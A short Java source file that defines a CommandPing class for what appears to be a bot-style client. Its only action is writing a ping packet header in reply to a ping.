package commands;

import com.redpois0n.common.packets.Headers;

import bot.Main;

public class CommandPing extends Command {

	/**
	 * Replies ping
	 */
	@Override
	public void perform() throws Exception {
		Main.writeByte(Headers.PACKET_PING);
	}

}
